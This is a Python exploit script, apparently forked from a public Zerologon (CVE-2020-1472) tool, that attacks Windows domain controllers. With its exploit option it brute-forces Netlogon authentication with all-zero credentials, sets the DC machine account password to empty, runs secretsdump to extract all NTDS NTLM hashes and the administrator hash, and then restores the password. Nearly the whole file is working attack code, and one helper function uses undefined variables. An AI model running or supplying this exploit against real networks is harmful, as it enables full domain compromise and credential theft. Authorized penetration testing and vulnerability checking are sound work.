#!/usr/bin/env python3

############################################
# by Leon Johnson
#
# This is a modified project forked from:
# https://github.com/dirkjanm/CVE-2020-1472
#
# It is used to identify and/or exploit
# CVE-2020-1472 aka zerologon.
# 
# If exploit is choosen, it will change the system account password to a blank value
# and dump the ntds.dit, then it will restore the system account password by calling 
# restore script after it dumps all the password hashes
# 
# Resource:
#   https://www.secura.com/pathtoimg.php?id=2055
#
# Debuging:
#       python -m pdb program.py
# ----------------------------------
# Colors
# ----------------------------------
NOCOLOR='\033[0m'
RED='\033[0;31m'
GREEN='\033[0;32m'
ORANGE='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
LIGHTGRAY='\033[0;37m'
DARKGRAY='\033[1;30m'
LIGHTRED='\033[1;31m'
LIGHTGREEN='\033[1;32m'
YELLOW='\033[1;33m'
LIGHTBLUE='\033[1;34m'
LIGHTPURPLE='\033[1;35m'
LIGHTCYAN='\033[1;36m'
WHITE='\033[1;37m'

import re
import sys # Used by len, exit, etc
import logging
import subprocess
import argparse # Parser for command-line options, arguments and sub-commands

from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.nrpc import NetrServerPasswordSet2Response, NetrServerPasswordSet2

from impacket import crypto

import hmac, hashlib, struct, sys, socket, time
from binascii import hexlify, unhexlify
from subprocess import check_call
from struct import pack, unpack

from impacket.examples import logger
from impacket import version
from impacket.dcerpc.v5.nrpc import NetrServerPasswordSet2Response, NetrServerPasswordSet2
from impacket.dcerpc.v5.dtypes import MAXIMUM_ALLOWED
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5.dtypes import NULL

from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5 import epm, nrpc
from Cryptodome.Cipher import AES
from binascii import unhexlify


# dump ntds needed packages:
from impacket.examples.secretsdump import LocalOperations, RemoteOperations, SAMHashes, LSASecrets, NTDSHashes


# Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be neccessary on average.
MAX_ATTEMPTS = 2000 # False negative chance: 0.04%

banner = """


"""

parser = argparse.ArgumentParser(description='Check if domain controller is vulnerable to the Zerologon attack aka CVE-2020-1472.\nResets the DC account password to an empty string when vulnerable.')
parser.add_argument('dc_ip', action='store', help="IP Address of the domain controller.")
parser.add_argument('-exploit', action='store_true',  help="Zero out the computer\'s hash")
group = parser.add_argument_group('connection')
group.add_argument('-port', choices=['135', '139', '445'], nargs='?', default='445', metavar="destination port",
        help='Destination port to connect to SMB Server')



class ChangeMachinePassword:
    KNOWN_PROTOCOLS = {
        135: {'bindstr': r'ncacn_ip_tcp:%s',           'set_host': False},
        139: {'bindstr': r'ncacn_np:%s[\PIPE\netlogon]', 'set_host': True},
        445: {'bindstr': r'ncacn_np:%s[\PIPE\netlogon]', 'set_host': True},
        }

    def __init__(self, username='', password='', domain='', port = None,
                 maxRid=4000):

        self.__username = username
        self.__password = password
        self.__port = port
        self.__maxRid = int(maxRid)
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''

    def dump(self, remoteName, remoteHost):

        stringbinding = epm.hept_map(remoteHost, nrpc.MSRPC_UUID_NRPC, protocol = 'ncacn_ip_tcp')
        logging.info('StringBinding %s'%stringbinding)
        rpctransport = transport.DCERPCTransportFactory(stringbinding)
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(nrpc.MSRPC_UUID_NRPC)

        resp = nrpc.hNetrServerReqChallenge(dce, NULL, remoteName + '\x00', b'12345678')
        serverChallenge = resp['ServerChallenge']

        ntHash = unhexlify(self.__nthash)

        # Empty at this point
        self.sessionKey = nrpc.ComputeSessionKeyAES('', b'12345678', serverChallenge)

        self.ppp = nrpc.ComputeNetlogonCredentialAES(b'12345678', self.sessionKey)

        try:
            resp = nrpc.hNetrServerAuthenticate3(dce, '\\\\' + remoteName + '\x00', remoteName + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,remoteName + '\x00',self.ppp, 0x212fffff )
        except Exception as e:
            if str(e).find('STATUS_DOWNGRADE_DETECTED') < 0:
                raise
        self.clientStoredCredential = pack('<Q', unpack('<Q',self.ppp)[0] + 10)

        request = NetrServerPasswordSet2()
        request['PrimaryName'] = '\\\\' + remoteName + '\x00'
        request['AccountName'] = remoteName + '$\x00'
        request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
        request['Authenticator'] = self.update_authenticator()
        request['ComputerName'] = remoteName + '\x00'
        encpassword = nrpc.ComputeNetlogonCredentialAES(self.__password, self.sessionKey)
        indata = b'\x00' * (512-len(self.__password)) + self.__password + pack('<L', len(self.__password))
        request['ClearNewPassword'] = nrpc.ComputeNetlogonCredentialAES(indata, self.sessionKey)
        result = dce.request(request)
        print(LIGHTGREEN+"[+] "+NOCOLOR, end = '')
        print(WHITE+'Changed password back to original value OK'+NOCOLOR)

    def update_authenticator(self, plus=10):
        authenticator = nrpc.NETLOGON_AUTHENTICATOR()
        authenticator['Credential'] = nrpc.ComputeNetlogonCredentialAES(self.clientStoredCredential, self.sessionKey)
        authenticator['Timestamp'] = plus
        return authenticator


def fail(msg):
    print(msg, file=sys.stderr)
    print(RED+'This might have been caused by invalid arguments or network issues.'+NOCOLOR, file=sys.stderr)
    sys.exit(2)

def try_zero_authenticate(dc_handle, dc_ip, target_computer):
    # Connect to the DC's Netlogon service.
    binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
    rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
    rpc_con.connect()
    rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

    # Use an all-zero challenge and credential.
    plaintext = b'\x00' * 8
    ciphertext = b'\x00' * 8

    # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
    flags = 0x212fffff

    # Send challenge and authentication request.
    nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
    try:
        server_auth = nrpc.hNetrServerAuthenticate3(
            rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
            target_computer + '\x00', ciphertext, flags
        )      


        # It worked!
        assert server_auth['ErrorCode'] == 0
        return rpc_con

    except nrpc.DCERPCSessionError as ex:
        # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
        if ex.get_error_code() == 0xc0000022:
            return None
        else:
            fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
    except BaseException as ex:
        fail(f'Unexpected error: {ex}.')

def exploit(dc_handle, rpc_con, target_computer):
    request = nrpc.NetrServerPasswordSet2()
    request['PrimaryName'] = dc_handle + '\x00'
    request['AccountName'] = target_computer + '$\x00'
    request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
    authenticator = nrpc.NETLOGON_AUTHENTICATOR()
    authenticator['Credential'] = b'\x00' * 8
    authenticator['Timestamp'] = 0
    request['Authenticator'] = authenticator
    request['ComputerName'] = target_computer + '\x00'
    request['ClearNewPassword'] = b'\x00' * 516
    return rpc_con.request(request)

def find_hash(pattern, ntds):
    file = open(ntds, "r")
    for line in file:
        if re. search(pattern, line):
            username, userid, lmhash, nthash = line.split(':')
            secrets_command = "secretsdump.py "+username+"'@"+options.dc_ip+"-hashes :"+nthash+" -outputfile "+hostname
            break


def perform_attack(dc_handle, dc_ip, target_computer):
    # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
    print(WHITE+'Performing authentication attempts...'+NOCOLOR)
    rpc_con = None
    for attempt in range(0, MAX_ATTEMPTS):
        rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)

        if rpc_con == None:
            print('=', end='', flush=True)
        else:
            break


    if rpc_con:
        if options.exploit:
            print(LIGHTGREEN+"\n[+] "+NOCOLOR, end = '')
            print(WHITE+'Target vulnerable, changing account password to empty string'+NOCOLOR)
            result = exploit(dc_handle, rpc_con, target_computer)
            if result['ErrorCode'] == 0:
                print(LIGHTGREEN+"[+] "+NOCOLOR, end = '')
                print(WHITE+"Exploit Successful!"+NOCOLOR)

                print(LIGHTGREEN+"[+] "+NOCOLOR, end = '')
                print(WHITE+"Attempting to dump hashes with secretsdump..."+NOCOLOR)
                secrets_command = "secretsdump.py -just-dc-ntlm -just-dc -no-pass '"+hostname+"$'@"+options.dc_ip+" -outputfile "+hostname
                print(LIGHTGREEN+"[+] "+NOCOLOR, end = '')
                print(WHITE+"Running commands... "+NOCOLOR)
                print(LIGHTGREEN+"[+] "+NOCOLOR, end = '')
                print(YELLOW+secrets_command+NOCOLOR)
                subprocess.run(secrets_command, shell=True, stdout=subprocess.DEVNULL)
                
                file = open(hostname+".ntds", "r")
                for line in file:
                    if re.search(":::", line):
                        if not re.search("\$",line):
                            if re.search(":500:", line):
                                hashes = line.split(':')
                                # search for "\" requires "\\\\"
                                if re.search('\\\\',hashes[0]):
                                    domain, username = hashes[0].split('\\')
                                else:
                                    domain = ""
                                    username = hashes[0]
                                nt_hash = hashes[3]
                                secrets_command = "secretsdump.py '"+username+"'@"+options.dc_ip+" -hashes :"+nt_hash+" -outputfile "+hostname
                                print(LIGHTGREEN+"[+] "+NOCOLOR, end = '')
                                print(YELLOW+secrets_command+NOCOLOR)
                                subprocess.run(secrets_command, shell=True, stdout=None)
                                break
                
                
                # restore password
                file = open(hostname+".secrets", "r")
                for line in file:
                    if re.search("hex", line):
                        hashes = line.split(':')
                        # search for "\" requires "\\\\"
                        plain_password_hex = hashes[2]
                        password = unhexlify(plain_password_hex.strip())
                        print(LIGHTGREEN+"[+] "+NOCOLOR, end = '')
                        print(WHITE+"Attempting to repare "+hostname+NOCOLOR)
                        print(LIGHTGREEN+"[+] "+NOCOLOR, end = '')
                        print(WHITE+"Running restore commands... "+NOCOLOR)
                        action = ChangeMachinePassword(username, password, domain, int(options.port))
                        action.dump(hostname, options.dc_ip)
                        break
                

                print(LIGHTGREEN+"[+] "+NOCOLOR, end = '')
                print(WHITE+"Verify system password repaired..."+hostname+NOCOLOR)
                secrets_command = "secretsdump.py '"+username+"'@"+options.dc_ip+" -hashes :"+nt_hash+" -just-dc-user "+hostname+"$"
                print(LIGHTGREEN+"[+] "+NOCOLOR, end = '')
                print(YELLOW+secrets_command+NOCOLOR)
                subprocess.run(secrets_command, shell=True, stdout=None)
                print('Exploit complete!')
            else:
                print('\nResult: ', end='')
                print(result['ErrorCode'])
                print('Non-zero return code, something went wrong?')
        else:
            print(LIGHTGREEN+"\n[+] "+NOCOLOR, end = '')
            print('Target vulnerable!\n')

    else:
        print(GREEN+"\nAttack failed. Target is probably patched."+NOCOLOR)
        sys.exit(1)


if __name__ == '__main__':
  if not (2 <= len(sys.argv) <= 3):
    #print( banner )
    parser.print_help()
    sys.exit(1)
  else:
    options = parser.parse_args()

    # get hostname from submitted IP then remove .local extensions from it
    host = socket.gethostbyaddr(options.dc_ip)[0]
    hostname = host.split('.')[0]

    print(WHITE+"Checking hostname: "+YELLOW+hostname.upper()+NOCOLOR)
    perform_attack('\\\\' + hostname , options.dc_ip, hostname)

